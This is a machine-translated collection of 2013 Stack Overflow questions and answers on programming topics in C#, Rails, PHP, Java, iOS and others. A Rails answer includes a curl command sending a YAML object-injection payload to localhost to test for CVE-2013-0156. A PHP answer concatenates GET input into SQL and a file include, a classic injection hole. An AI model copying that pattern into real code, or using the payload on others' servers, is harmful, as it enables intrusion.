## 回答 #1

> 赞同：1
> 
> 时间：2013-01-16T06:28:29.733

我假设您想知道如何从您的 SVN 项目中取消跟踪 eclipse 元数据和设置文件？

您发布的链接已经包含有关如何忽略 SVN 项目中的文件的教程。SVN 书[http://svnbook.red-bean.com/en/1.1/ch07s02.html](http://svnbook.red-bean.com/en/1.1/ch07s02.html)对此有更多信息。

基本上，您需要在 svn:ignore 属性上添加相应文件夹的资源文件/目录名称。

如果您已经在 svn 上提交了文件，您可以通过执行**svn rm --keep-local**取消跟踪它，并将文件模式添加到 svn:ignore 属性

# c# - .NET 安全性 - 添加新用户

> ID：14346605
> 
> 赞同：0
> 
> 时间：2013-01-15T20:46:56.770
> 
> 标签：c#, asp.net

我在 c# MVC 中使用它。我正在为具有以下字段的用户创建一个注册屏幕

```
 UserName,Password,Role,Location 
```

**角色**可以是“管理员”或“用户” 。

**位置**，可以是“纽约”或“芝加哥” 。

用户填写表格并单击提交后，我有以下代码：

```
 .....
     .....
     MembershipCreateStatus createStatus;
     Membership.CreateUser(model.UserName, model.Password, null, null, null, true, null, out createStatus);

    if (createStatus == MembershipCreateStatus.Success)
    {
       FormsAuthentication.SetAuthCookie(model.UserName, false /* createPersistentCookie */);
       Roles.AddUserToRole(model.UserName, model.Role);
       return RedirectToAction("Index", "Home");
    } 
```

正如您在上面看到的，我已经负责创建用户并为该用户提供角色。我不确定如何将位置与用户和角色联系起来。Location 将进入哪个 aspnet 表？有没有一种方法已经可以处理这样的事情？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:52:52.637

如果您拥有的唯一额外信息是位置，那么这可能有点矫枉过正，但我​​认为您最好的朋友是个人资料提供者。看看[这个链接](http://msdn.microsoft.com/en-us/library/014bec1k%28v=vs.100%29.aspx)。您可以为给定用户定义自己的信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:58:29.313

1：可以使用内置的[ASP.NET Profile](http://www.codeproject.com/Articles/281602/ASP-NET-Profile-Provider)来存储自定义用户信息

2：为了更加定制化并更好地控制数据操作，您必须创建一个单独的表来存储其他用户详细信息。[类似的](http://weblogs.asp.net/gurusarkar/archive/2009/01/27/storing-user-profile-into-a-custom-table-using-createuser-wizard-control.aspx)东西。

3：如果你认为永远只有一个字段，最奇怪的方法是使用MembershipUser 的[Comment 属性](http://msdn.microsoft.com/en-us/library/system.web.security.membershipuser.comment.aspx)。虽然不确定它如何最适合您的需求。

# .htaccess - .htaccess：隐藏现有文件，但通过 RewriteRule 使用它们

> ID：14346612
> 
> 赞同：0
> 
> 时间：2013-01-15T20:47:17.097
> 
> 标签：.htaccess, mod-rewrite

我已经尝试了几种方法，在这里阅读了很多示例和问题，但仍然无法弄清楚它是否根本无法完成。
我想要的是使用某种 URL 格式强制访问某些文件和功能，并拒绝访问（假 404）其他所有内容 - 甚至是现有文件/目录。

这部分工作：

```
RewriteEngine On

RewriteRule ^([\w]+)$ /somefolder/index.php?page=$1 [L]
RewriteRule ^person/([\d]+) /somefolder/index.php?page=person&id=$1 [NC,L]
RewriteRule ^css/([\w]+\.css) /somefolder/css/$1 [NC,L]
RewriteRule ^images/([\d]{4}-[\d]{2}-[\d]{2}/[\d]+\.(gif|jpe?g)) /somefolder/images/$1 [NC,L] 
```

但是，以下行会导致 500 内部服务器错误：

```
RewriteRule ^(.*)$ /somefolder/index.php?page=error [R=404] 
```

我希望如果访问者请求 /somefolder/index.php（或任何其他可能存在或不存在的文件/目录），它应该返回 404 和错误页面。我还计划稍后添加：

```
ErrorDocument 404 /somefolder/index.php?page=error 
```

.htaccess 文件位于根目录中。这完全可行吗？

例子：

（用户访问的页面和其他页面链接的页面）
[http://example.com/breakfast](http://example.com/breakfast) -> [http://example.com/somefolder/index.php?page=breakfast](http://example.com/somefolder/index.php?page=breakfast)
（页面使用的样式表）
[http:// /example.com/css/default.css](http://example.com/css/default.css) -> [http://example.com/somefolder/css/default.css](http://example.com/somefolder/css/default.css)
（文档中使用的图像）
[http://example.com/images/2011-01-01/ test.jpg](http://example.com/images/2011-01-01/test.jpg) -> [http://example.com/somefolder/images/2011-01-01/test.jpg](http://example.com/somefolder/images/2011-01-01/test.jpg)
（其他）
[http://example.com/this/may.exist](http://example.com/this/may.exist) -> 404 + 错误页面

.. 这意味着如果有人试图获取[http://example.com/somefolder/css/default.css](http://example.com/somefolder/css/default.css)（存在），他们将不会收到它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-18T09:09:57.327

这就是我想要的；它拒绝直接访问所有 php 文件，但允许它们通过快捷方式运行：

```
ErrorDocument 403 /index.php?page=error
ErrorDocument 404 /index.php?page=error

RewriteEngine On
RewriteRule ^$ /index.php?page=start [L]
RewriteRule ^([\w]+)$ /index.php?page=$1 [L]

<Files ".ht*">
    Order Allow,Deny
</Files>

<Files "*.php">
    Order Deny,Allow
    Deny from All
    Allow from env=REDIRECT_STATUS
</Files> 
```

这会导致 500 错误，因为（我认为）它会创建一个无限循环 - 每次发生重写时，都会再次处理 htaccess 文件：

```
RewriteRule ^(.*)$ /somefolder/index.php?page=error [R=404] 
```

# c++ - 如何保护班员？

> ID：14346613
> 
> 赞同：0
> 
> 时间：2013-01-15T20:47:19.083
> 
> 标签：c++, assignment-operator

我有一个类*myclass*封装了一个 fstream 指针（不仅仅是 fstream ，因为 fstream 声明了一个私有赋值运算符，所以我无法正确复制*myclass*的实例，但这不是问题！）。

另外，我的类有两个函数*open()*和*close()*分别打开和关闭 fstream 对象。fstream 是打开的事实被记录到myclass 内部的私有变量*bool isOpen中。*

*因此，如果只有在isOpen == true*时才能执行*myclass*实例中实现的任何其他函数。

 *我希望这样，当我复制*myclass*的实例时，fstream-pointer在每种情况下都指向 null 和/或*isOpen == false 。*这样，我不允许不同的实例使用同一个文件。在某种程度上，我正在保护另一个实例所具有的价值。

那么，如何定义 *myclass 的赋值运算符呢？或者，也许还有其他方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:54:55.443

您必须为您的类实现一个复制构造函数和一个赋值运算符。

此外（如果您仍然使用指向 fstream 对象的指针成员，尽管“Konrad Rudolf”建议不要这样做）不要忘记`delete`在您的析构函数中使用指针来`fstream`调用对象的析构函数以关闭打开的文件。你不能确定每个`open()`人都会有一`close()`对。*

# ruby-on-rails - 如何在不升级 rails 的情况下从 (CVE-2013-0156) 修复我的 2.3.5 rails 应用程序

> ID：14346614
> 
> 赞同：1
> 
> 时间：2013-01-15T20:47:19.453
> 
> 标签：ruby-on-rails, ruby

当我在 environment.rb 中使用 ActionController::Base.param_parsers.delete(Mime::XML) 时它会破坏它，我将它放在文件 en 的初始化块之外。

我正在使用 nginx/passenger，有趣的是，当我将 ActionController::Base.param_parsers.delete(Mime::XML) 添加到我的开发实例时，它确实解决了问题，但是当我将它部署到生产环境时，它破坏了一切。

我真的不想升级到 Rails 3，因为这是遗留代码，我正在做一个辅助项目，但现在我只想拥有一个安全的应用程序。

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T22:27:59.960

你有一个最典型的 ./config/environment.rb 文件吗？

我把它放在两个地方：在初始化器中和最后的“end”关键字之前。YMMV。

```
# ./config/environment.rb
Rails::Initializer.run do |config|
  ...
  ActiveSupport::CoreExtensions::Hash::Conversions::XML_PARSING.delete('symbol')
  ActiveSupport::CoreExtensions::Hash::Conversions::XML_PARSING.delete('yaml')
end
ActiveSupport::CoreExtensions::Hash::Conversions::XML_PARSING.delete('symbol')
ActiveSupport::CoreExtensions::Hash::Conversions::XML_PARSING.delete('yaml') 
```

要验证它是否有效，请使用本地开发服务器为 rails 2.x 运行此命令：

```
curl -i -H "Content-Type: application/xml" -X POST \
  -d '<id type="yaml">--- !ruby/object:ActionController::Base bar: 1</id>' \
  http://localhost:3000 
```

查看您的日志。如果 params[:id] 是一个对象，那么你很容易受到攻击。如果它只是一个字符串，那么你的修复工作。[感谢 HackerNews 用户提供所有这些信息]

当我部署到Passenger 生产时，它让我大吃一惊。我通过重新启动 Apache 解决了这个问题。您可能想对 Nginx 进行同样的尝试。

我不是 100% 确定这是最好的方法，或者涵盖所有情况。此处的其他任何人都可以添加或编辑此内容以提供帮助。祝你好运！

# c# - 为什么我不能按索引访问 KeyedCollection 项目？

> ID：14346616
> 
> 赞同：3
> 
> 时间：2013-01-15T20:47:21.597
> 
> 标签：c#, .net, collections

我有这段代码（我希望它可以工作，但它失败了）。我真的不知道为什么。请帮忙

```
 static void Main(string[] args)
    {
        var x = new MyKeyedCollection();

        x.Add(new MyType() { Key = 400L, Value = 0.1 });
        x.Add(new MyType() { Key = 200L, Value = 0.1 });
        x.Add(new MyType() { Key = 100L, Value = 0.1 });
        x.Add(new MyType() { Key = 300L, Value = 0.1 });

        //foreach (var item in x)
        for (int i = 0; i < x.Count; i++)
        {
            //Debug.WriteLine(item.PriceLevel);
            Debug.WriteLine(x[i].Key);
        }
    }
}

public class MyType 
{
    public long Key;
    public double Value;
}

public class MyKeyedCollection : KeyedCollection<long, MyType>
{
    protected override long GetKeyForItem(MyType item)
    {
        return item.Key;
    }
} 
```

例外：

> System.Collections.Generic.KeyNotFoundException 未处理
> Message=字典中不存在给定的键。
> Source=mscorlib StackTrace：在 System.Collections.Generic.Dictionary 的 System.ThrowHelper.ThrowKeyNotFoundException() `2.get_Item(TKey key) at System.Collections.ObjectModel.KeyedCollection`2\. ...\Program.cs:line 中 KeyedCollectionTest.Program.Main(String[] args) 的**get_Item(TKey key)** 25 at System.AppDomain._nExecuteAssembly(Assembly assembly, String[] args) at Microsoft.VisualStudio.HostingProcess.HostProc.RunUsersAssembly() at System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state) at System.Threading .ThreadHelper.ThreadStart() 内部异常：

为什么它会尝试获取 Key 而不是索引？密钥显然很长，而不是 int。我确信我之前使用过 KeyedCollection，它对于长键和 int 索引工作得很好。

我尝试在版本 2、3.5、4、4.5 中编译（使用 VS2012）...

不明白。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-15T20:52:59.407

> 为什么它会尝试获取 Key 而不是索引？密钥显然很长，而不是 int。

但是`int`可以转换为`long`，所以它是一个有效的候选成员。

问题是`this[TKey key]`索引器最初是在 中声明的`KeyedCollection`，而`this[int index]`索引器最初是在 中声明的`Collection`。重载决议的规则指定首先搜索最派生的类，并且*只*考虑首先在该类型中声明的成员。只有当*搜索*失败时，编译器才会向上移动到类型层次结构中的下一个级别。

所以如果你写：

```
Collection<MyType> collection = x;
for (int i = 0; i < x.Count; i++)
{
    Debug.WriteLine(collection[i].Key);
} 
```

它会起作用 - 因为编译时类型`collection`是 just `Collection<T>`，它*只有*“int index”索引器。

这是一个不使用泛型、索引器或抽象类的示例，它显示了相同的行为：

```
using System;

class Base
{
    public void Foo(int x)
    {
        Console.WriteLine("Base.Foo(int)");
    }
}

class Derived : Base
{
    public void Foo(long y)
    {
        Console.WriteLine("Derived.Foo(long)");
    }
}

class Program
{
    static void Main()
    {
        Derived x = new Derived();
        Base y = x;
        x.Foo(5); // Derived.Foo(long)
        y.Foo(5); // Base.Foo(int)
    }
} 
```

有关更多涉及的有趣规则，请参阅我[关于重载的文章。](http://csharpindepth.com/Articles/General/Overloading.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T12:10:22.593

```
class Program
{
    static void Main(string[] args)
    {
        var x = new MyKeyedCollection();

        x.Add(new MyType() { Key = 110L, Value = 0.1 });
        x.Add(new MyType() { Key = 122L, Value = 0.1 });
        x.Add(new MyType() { Key = 233L, Value = 0.1 });
        x.Add(new MyType() { Key = 344L, Value = 0.1 });

        foreach(int key in x.Keys())
        {   
            Console.WriteLine(x[key].Key);
        }

        Console.Read();
    }
}

public class MyType
{
    public long Key;
    public double Value;
}

public class MyKeyedCollection : KeyedCollection<long, MyType>
{
    protected override long GetKeyForItem(MyType item)
    {
        return item.Key;
    }

    public IEnumerable<long> Keys()
    {
        foreach (MyType item in this.Items)
        {
            yield return GetKeyForItem(item);
        }
    }
} 
```

迭代键的方法不会在这里解决问题，还是我遗漏了什么？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T18:55:03.163

您也可以简单地使用：

`Debug.WriteLine(x.ElementAt(i).Key);`

“ElementAt”允许您检索指定索引处的元素。如果您的键是 int 类型，这会很好地工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-02-01T09:50:12.920

如果您尝试确定*如何*通过索引访问 KeyedCollection 项目（如果您已将其键入），则此页面确实会出现在搜索结果中`int`，因此在此处回答该问题可能很有用。你这样做：

```
myKeyedCollectionInstance.Items[index]; 
```

`index`一个在哪里`int`。 `.Items`是因为`IList`, 和 is `protected`，所以要使它在类和继承自它的类之外可用，您必须添加一个`public`or`internal`访问器方法，如下所示：

```
internal new IList<Occupation> AllItems
{
    get { return this.Items; }
} 
```

# java - 列表与列表

> ID：14346622
> 
> 赞同：10
> 
> 时间：2013-01-15T20:47:46.787
> 
> 标签：java, generics

> **可能重复：**
> [<?> 和 <? 之间有什么区别？在 Java 泛型中扩展 Object>？](https://stackoverflow.com/questions/8055389/whats-the-difference-between-and-extends-object-in-java-generics)

我发现了这一点`List<?>`并`List<? extends Object>`以同样的方式行事。至于我，他们之间没有区别。如果我不正确，你能解释一下区别吗？

```
import java.util.ArrayList;
import java.util.List;

public class TestClass {

static void func1(List<?> o, Object s) {
    o.add(null); // only null
    o.add(s); // wrong
    o.get(0);  // OK
}

static void func2(List<? extends Object> o, Object s) {
    o.add(null); // only null
    o.add(s); // wrong
    o.get(0); // OK
}

public static void main(String[] args) {
    func1(new ArrayList<String>(), new Integer(1));
    func2(new ArrayList<String>(), new Integer(1));

    List<? extends Object> list1 = new ArrayList<Object>();
    List<?> list2 = new ArrayList<Object>();

    List<? extends Object> list3 = new ArrayList<String>();
    List<?> list4 = new ArrayList<String>();
}
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-15T22:07:41.480

这很复杂...

对于任何类型变量`T`，规范说[http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.4](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.4)

> 每个类型变量...都有一个界限。如果没有为类型变量声明边界，则假定为 Object。

有人会认为通配符也是如此，`?`应该只是`? extends Object`.

然而，通过规范搜索，根本没有证据表明通配符必须具有上限（或下限）。“无界”`?`始终与有界通配符区别对待。

我们可以从子类型化规则中推断，`List<?>`和`List<? extends Object>`是彼此的子类型，即它们*基本上*是相同的类型。（推论取决于`E`in`interface List<E>`具有隐式上限这一事实`Object`；但规则不要求通配符有界限）

然而，规范对两者的处理方式不同。例如[http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.7](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.7) `List<?>`是可具体化的类型，但`List<? extends Object>`不是，这意味着

```
 // ok
    List<?>[] xx = {};
    // fail
    List<? extends Object>[] yy = {};

    // ok
    boolean b1 = (y instanceof List<?>);
    // fail
    boolean b2 = (y instanceof List<? extends Object>); 
```

我不明白为什么。说通配符必须有一个上限和一个下限似乎完全没问题，默认为`Object`and `null type`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-15T20:53:23.230

两者都是相同的，因为 Java 中的所有对象都可以扩展`Object`。我更喜欢`List<?>`，因为它更简洁。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T20:54:36.413

类似于如何`MyClass extends Object`为每个类`List<? extends Object>`是一样的`List<?>`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T20:55:32.203

尽管我抄袭了 Marko，对此我深表歉意，但他的评论是正确的答案。

没有区别，因为隐含的每个 type `extends Object`。

# python - 模型对象未在 Django 模板页面中列出？

> ID：14346624
> 
> 赞同：0
> 
> 时间：2013-01-15T20:47:50.190
> 
> 标签：python, django

我有一个模板页面，它遍历我的模型对象并列出每个对象。我的模板名为 user_page.html，下面是列出项目的代码：

```
<h3>List of your games</h3>
{% if games %}
    <ul>
    {% for i in games %}
        <li>Game</li>
    {% endfor %}
    </ul>
{% else %}
    You have no games.
{% endif %} 
```

每当我访问 user_page.html 时，我都会不断收到消息“你没有游戏”，但我知道我有 Game 对象，因为我在控制台中键入 Game.objects.all() 时会看到它们。到目前为止，这是我在 views.py 中的代码：

```
@login_required
def create_game(request):
    game = Game(creator=request.user)
    game.save()
    variables = RequestContext(request, {
        'game': game,
        'board': game.get_set_board()
    })
    return render_to_response('battleship/create_game.html', variables)

@login_required
def list_games(request):
    games_list = Game.objects.get_by_user(request.user)
    variables = RequestContext(request, {
        'games': games_list
    })
    return render_to_response('battleship/user_page.html', variables) 
```

这是我的游戏模型的代码：

```
class Game(models.Model):
    creator = models.ForeignKey(User, related_name='creator_set')
    def get_set_board(self):
        board = Board()
        return board
    def get_target_board(self):
        board = Board()
        return board 
```

有任何想法吗？提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T01:13:34.980

解决了这个问题。原来问题是 URLS.py 映射。显然，我的 user_page.html 已经有一个名为 user_page 的函数映射到它。我只需要将 list_games 函数代码放在 user_page 函数中。傻我。无论如何谢谢大家:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:43:19.943

尝试像这样返回您的回复：

```
return render_to_response('battleship/user_page.html', {'games' : games_list}, context_instance=RequestContext(request)) 
```

看看这是否有所作为。

# objective-c - NSTimers 没有重复运行

> ID：14346627
> 
> 赞同：-1
> 
> 时间：2013-01-15T20:48:02.437
> 
> 标签：objective-c, ios6

我的计时器没有重复运行有问题。我仍然是 iOS 编码的新手，但从我在这个网站上收集的内容和对其他问题的回答来看，它应该可以工作。基本上，计时器应该在按下 timerStart 按钮时开始更新，并在按下 timerStop 按钮时停止。

下面是示例代码 .h 文件

```
#import <UIKit/UIKit.h>
#import <CoreLocation/CoreLocation.h>

    @interface PGSecondViewController : UIViewController <CLLocationManagerDelegate>

    {
    NSTimer *Timer;
    IBOutlet UILabel *displayTimer;
    int ticks;

    }

    @property (nonatomic, retain) IBOutlet UILabel *displayTimer;

    -(IBAction)timerStart:(id)sender;
    -(IBAction)timerStop:(id)sender;
    -(void)updateTimer:(NSTimer *)theTimer;

    @end 
```

这是.m文件

```
#import "PGSecondViewController.h"

@interface PGSecondViewController ()

@end

@implementation PGSecondViewController

@synthesize displayTimer;

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
if (self) {
    UITabBarItem *tbi = [self tabBarItem];
    [tbi setTitle:@"Start"];

    // Custom initialization
}
return self;
}

- (void)viewDidLoad
{
[super viewDidLoad];
// Do any additional setup after loading the view, typically from a nib.
[displayTimer setText:@"00:00:00"];

}

}

- (void)didReceiveMemoryWarning
{
[super didReceiveMemoryWarning];
// Dispose of any resources that can be recreated.
}  

-(IBAction)timerStart:(id)sender;
{
Timer = [NSTimer scheduledTimerWithTimeInterval:1.0 target:self     selector:@selector(updateTimer:) userInfo:nil repeats:YES];

}
-(IBAction)timerStop:(id)sender;
{
[Timer invalidate];
Timer = nil;
}

-(void)updateTimer:(NSTimer *)theTimer
{
if (ticks == nil)
{
    ticks = 0;
}
else
{
    ticks = ticks + 1;
}
[displayTimer setText:[NSString stringWithFormat:@" %d ", ticks]];

}

@end 
```

基本上我得到的是计时器开始一次并且 NSLabel 显示 0 但之后没有任何反应。我已经在安排计时器后使用 [[NSRunLoop currentRunLoop] addTimer:Timer forMode:NSDefaultRunLoopMode] 和 [[NSRunLoop currentRunLoop] run] 进行了尝试，但它没有帮助。

有任何想法吗？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:59:56.080

你的 if(ticks == nil) 坏了；ticks 是一个 int，而不是一个对象。它的初始值为 0。

我只是通过稍微更改该方法来修复，一切正常。

```
-(void)updateTimer:(NSTimer *)theTimer
{
    ticks++;
    [displayTimer setText:[NSString stringWithFormat:@" %d ", ticks]];
} 
```

# php - PHP 从 MySQL 查询切换页面

> ID：14346628
> 
> 赞同：0
> 
> 时间：2013-01-15T20:48:04.797
> 
> 标签：php, mysql, switch-statement, case

我有以下 PHP 代码：

```
//switch
if (isset($_GET['pg']))
    $pg = $_GET['pg'];

else{
    $pg = 'home';
    }

switch ($pg){
    case 'home':
        if (file_exists("pages/home.php")){
            include("pages/home.php");}
        break;

    case 'about':
        if (file_exists("pages/about.php")){
            include("pages/about.php");}
        else{include_once("error.php");}
        break;

    case 'products':
        if (file_exists("pages/products.php")){
            include("pages/products.php");}
        else{include_once("error.php");}
        break;

    case 'contact':
        if (file_exists("pages/contact.php")){
            include("pages/contact.php");}
        else{include_once("error.php");}
        break;

    default:
        if (file_exists("error.php")){
        include("error.php");}
}
?> 
```

如何通过 MySQL 查询进行此切换？我尝试过这样的事情，但不幸的是不起作用：

```
$SQLquery = "SELECT * FROM pages";
$result = mysql_query($SQLquery);

switch ($pg){
while($row = mysql_fetch_array($result)) {
    case $row['id']:
        include($row['id'].'.php');
        break;
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:01:06.030

AFAIK，您不能在运行时动态定义 switch 语句。这些控制结构在代码运行之前被解析，以后不能更改（如果我错了，请纠正我）。

我会尝试这样的事情：

```
while($row = mysql_fetch_array($result)) {
    if($row['id'] == $pg){
        include($row['id'].'.php');
        break;
    }
} 
```

**编辑：**再想一想，@Marc M 作为对该问题的评论发布的解决方案要好得多。做这个：

```
$SQLquery = "SELECT * FROM pages WHERE id='" . $pg ."';";
$result = mysql_query($SQLquery);

if($row = mysql_fetch_array($result))
    include($row['id'].'.php');
else
    include("error.php"); 
```

并且由于您希望已将 MySQL 列声明`id`为`UNIQUE`，因此您要么得到精确的一行，要么`"error.php"`将包含您的文件。

# database - 查找没有连接匹配的记录

> ID：14346630
> 
> 赞同：1
> 
> 时间：2013-01-15T20:48:18.640
> 
> 标签：database, postgresql

我有一个邮件收件人表，通过 many2many 表（recipients_mails）链接到邮件消息表。每次发送邮件时，我都会在 many2many 表中添加一行。

我需要知道哪些收件人没有收到 ID 为 n 的电子邮件。3.

桌子是这样雕刻的：

```
Recipients
recipient_id, email

Recipients_mails
recipient_fk, mail_fk

Mails
mail_id, content etc. 
```

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:54:18.747

```
SELECT  *
FROM    recipients
WHERE   NOT EXISTS
        (
        SELECT  NULL
        FROM    recipients_mails
        WHERE   (recipient_fk, mail_fk) = (recipient_id, 3)
        ) 
```

# php - 登录网站

> ID：14346631
> 
> 赞同：0
> 
> 时间：2013-01-15T20:48:33.857
> 
> 标签：php, mysql

我正在设计一个用户登录的网站。创建帐户时，我检查用户名是否已经存在。是否应该在脚本内进行此检查，还是应该将用户名设为表的主键？我正在使用 MySQL 和 PHP。

所以我应该编写一个脚本来查询数据库以检查提供的用户名是否已经在使用中，或者我应该尝试插入给定的用户名并将该字段作为主键，如果失败则意味着用户名是正在使用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T20:53:57.213

我会采取对数据库中的用户名字段设置唯一约束的方法，然后尝试在数据库上插入。不要先检查现有的用户名，因为这只是一个不必要的查询。

然后，您可以评估 mysql 响应以确定插入是否由于重复键或其他问题而失败。

# iphone - 在长时间操作中延迟后旋转活动指示器

> ID：14346634
> 
> 赞同：3
> 
> 时间：2013-01-15T20:48:39.393
> 
> 标签：iphone, ios, objective-c, core-foundation

我正在开发一个带有 UITableView 的 iOS 应用程序，它在某个阶段添加或删除了一堆行。由于存在大量行，因此此操作可能需要很长时间。但是，我不能轻易确定它是否需要很长时间。

仅当此操作需要很长时间时，我才想显示 UIActivityIndi​​cator （微调器）。我一直这样做的方式是启动冗长的操作，经过一些延迟（比如 0.5 秒）后，我们测试操作是否仍在运行，如果是，我们开始显示 UIActivityIndi​​cator。

如果您可以在后台线程中运行冗长的操作，这没有问题。但是，这种特殊情况很棘手，因为冗长的操作 (deleteRowsAtIndexPaths:withRowAnimation:) 必须在主线程中运行（如果我在后台线程中运行此方法，当后台线程尝试更新 UI 时，应用程序偶尔会崩溃）。

我尝试过的最新事情是这样的：

```
- (void) manipulateTableView
{
    stillBusy = YES;
    [self performSelectorInBackground:@selector(waitBeforeShowingBusyIndicatorForView:) withObject:view];
    .
    .
    .
    [self performSelectorOnMainThread:@selector(deleteRowsAtIndexPathsWithRowAnimation:) withObject:args waitUntilDone:YES];
    stillBusy = NO;
}

- (void) waitBeforeShowingBusyIndicatorForView:(UIView*) view
{
    usleep((int) (BUSY_INDICATOR_DELAY * 1000000));
    if (stillBusy)
        [self performSelectorOnMainThread:@selector(showBusyIndicatorForView:) withObject:view waitUntilDone:NO];
} 
```

因为 showBusyIndi​​catorForView: 操作 UI，所以必须在主线程调用，否则应用可能会崩溃。

当 deleteRowsAtIndexPaths:withRowAnimation: 耗时很长时，waitBeforeShowingBusyIndi​​catorForView: 中的延迟到期，调用 performSelectorOnMainThread:... 方法并立即返回。但是只有在对 deleteRowsAtIndexPaths:withRowAnimation: 的调用完成**后才**调用 showBusyIndi​​catorForView: 方法，这违背了目的。

我想我明白为什么会发生这种情况。deleteRowsAtIndexPaths:withRowAnimation: 方法在主循环的迭代中运行，当它运行时，对 showBusyIndi​​catorForView: 的调用作为主循环的消息排队。只有在主循环完成执行 deleteRowsAtIndexPaths:withRowsAnimation: 后，它才会轮询队列以获取下一条消息，然后开始执行 showBusyIndi​​catorForView:。

有没有办法让这个东西正常工作。是否有可能中断主循环并使其立即执行 showBusyIndi​​catorForView: ？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T22:50:14.953

两个选项突然出现在我面前：

1.  修改您长时间运行的前台例程，以便将其分成多个块，您可以重复地将进程的每个步骤分别分派到主队列。并以您设计流程的方式执行此操作，以便它分派慢速前台任务的每个部分，并且仅在前一部分完成时将下一步分派到主队列。（不要只为主队列排队一大堆进程。）这样，当微调器排队时，您就有机会与其他作业相吻合。如果您要为删除设置动画，那可能是不可能的，但话又说回来，我无法想象做一个`deleteRowsAtIndexPaths`.

2.  可能更好，如果更新需要那么长时间，我会问为什么会这样。`deleteRowsAtIndexPaths`不应该解释这一点。具体来说，不要发出多个`deleteRowsAtIndexPaths`，而是构建`NSMutableArray`要删除的行，然后在单个 UI 调用中删除它们。我刚刚删除了 998 行（包括它们的底层模型对象），这几乎是瞬间完成的。

如果可能的话，我会倾向于选项 2。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:03:14.343

当主线程上运行冗长的操作时，您无法更新 UI。

如果您的延迟确实是由`-deleteRowsAtIndexPaths:withRowAnimation:`（如果您要求表格视图以动画方式删除几千行）引起的延迟，那么最好的解决方案是避免动画超过某个（相对较小）阈值和只是打电话`-reloadData`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-16T18:43:54.697

罗布，谢谢你的建议！它帮助我找到了解决方案！

首先，为了记录，我只为所有行调用了一次 deleteRowsAtIndexPaths （数千行：O！）。

我所做的关键观察是，当动画开始时，屏幕上只有少数行可见。特别是该部分的顶部行，因为通过点击该部分的标题来触发行的删除。因此，行不必都是动画的一部分。我可以先删除所有不可见的行（没有动画），然后只删除带有动画的可见行。

然后我对 deleteRowsAtIndexPaths 进行了两次调用——第一次删除了所有不可见的行，第二次删除了可见（顶部）的行。现在第一次调用 deleteRowsAtIndexPaths 花了很长时间，因为它必须删除数千行，并且活动指示器视图再次没有机会开始动画。然后，我将行删除的第一阶段更改为一次删除行 200 的循环，如下所示：

```
for ( /* next range of invisible rows */ )
{
    // Compute index paths of the bottom 200 rows.
    [self performSelectorOnMainThread:@selector(deleteRowsAtIndexPathsWithRowAnimation:) withObject:args waitUntilDone:YES];
} 
```

然后，启动活动指示器动画的方法将在两个后续调用 deleteRowsAtIndexPaths…: 之间排队。

有趣的是：现在我一次删除 200 行，这需要相当长的时间，但它仍然比我一次删除它们要快得多！:|

# c#-4.0 - 使用隔离存储 WP7 在 C# 中解压缩文件

> ID：14346636
> 
> 赞同：0
> 
> 时间：2013-01-15T20:48:41.567
> 
> 标签：c#-4.0

我对 WP7 平台有点陌生，我正在做一些与隔离存储有关的事情，现在有点卡住了，这很简单，但不适合我。我的应用程序需要下载一个 zip 文件并保存到处理中，我已经完成了下载部分，我可以将其保存到一个独立的存储中，我使用独立的存储资源管理器检查状态，文件就在那里。

```
void wcMedia_OpenReadCompleted(object sender, OpenReadCompletedEventArgs e)
{

    filename1 = "book" + bookId + ".zip";
    if (e.Error != null) return;
    var str = e.Result;

    using (var myStore = IsolatedStorageFile.GetUserStoreForApplication())
    {
        if (myStore.FileExists(filename1)) myStore.DeleteFile(filename1);
        var buffer = new byte[1024];
        using (var isoStorStr = myStore.OpenFile(filename1, FileMode.CreateNew))
        {
            int bytesRead = 0;
            while ((bytesRead = str.Read(buffer, 0, 1024)) > 0)
                isoStorStr.Write(buffer, 0, bytesRead);
        }
    }

    Debug.WriteLine("done");
} 
```

我的问题是如何提取 zip 文件，我的 zip 包含另外 3 个文件夹和一些 mp3 和图像文件。我尝试过 3rd 方库，例如：SharpZipLib、dotnetzip，但没有成功。有人可以帮我吗。非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T18:24:13.163

不要认为这是你的错。看起来它源于使用旧版本的 .Net 编译的 DotNetZip。

见这里：[http ://dotnetzip.codeplex.com/workitem/14049](http://dotnetzip.codeplex.com/workitem/14049)

一条评论列出了一个可以修复 4.0 的补丁。如果您更改库并遇到错误，请将其发布，我会帮助您使其正常工作。

# testing - 我应该对我的 SOA 部分进行验收测试吗？

> ID：14346641
> 
